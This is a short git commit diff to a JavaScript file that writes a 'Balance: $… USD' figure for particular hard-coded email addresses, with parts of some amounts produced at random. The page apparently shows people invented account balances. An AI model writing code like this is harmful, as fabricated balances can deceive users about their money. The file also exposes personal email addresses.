e0942432239ef056c6f90990f099cad1dfe9fb63
Maselecybernova <164945452+Maselecybernova@users.noreply.github.com>
2024-04-18 17:38:18 +0200

    Update script.js

--- script.js
+++ script.js
@@ -44,7 +44,8 @@ function updateNumber() {
           var numberElem = document.getElementById("number");
 
           numberElem.innerHTML = "Balance: " + "<span style='color: #ffffff; font-weight: bold; font-size: 17px;'> $7" + randomNum +"."+ randomNum2 + "</span> USD";
-     }
+     
+      }
       if (email=="gnkisa31@gmail.com"){
   
           var randomNum = Math.floor(Math.random() * (1 - 5 + 1) + 9);
@@ -82,8 +83,8 @@ if (email=="kgopisochestahmafuta@gmail.com"){
 
           var numberElem = document.getElementById("number");
 
-          numberElem.innerHTML = "Balance: " + "<span style='color: #ffffff; font-weight: bold; font-size: 17px;'> $26.74</span> USD";
-  
+          numberElem.innerHTML = "Balance: " + "<span style='color: #ffffff; font-weight: bold; font-size: 17px;'> $16." + randomNum2 + "</span> USD";
+     
   }
   
 
